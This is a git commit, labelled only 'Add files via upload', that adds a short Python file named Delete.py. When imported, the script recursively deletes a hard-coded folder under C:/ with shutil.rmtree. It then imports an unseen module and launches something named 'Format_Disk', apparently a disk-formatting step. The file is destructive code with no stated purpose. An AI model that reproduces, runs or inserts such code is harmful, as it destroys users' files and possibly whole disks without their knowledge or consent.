35de2a6ed7dc55d444cd7a548f1bdfd75b2d7952
krom161 <90455285+krom161@users.noreply.github.com>
2022-06-15 22:21:52 +0300

    Add files via upload

---
+++ Delete.py
@@ -0,0 +1,19 @@
+import shutil
+import os
+import os.path
+
+
+class location:
+    def loc1():
+        geoposition = "C:/"
+        name = "Secret Folder"
+        path = os.path.join(geoposition, name)
+        if os.path.isabs(path):
+            shutil.rmtree(path)
+            print("Complete")
+            import Border
+            os.startfile('Format_Disk')
+        else:
+            raise ValueError("Location not identified {}".format(path))
+
+    loc1()
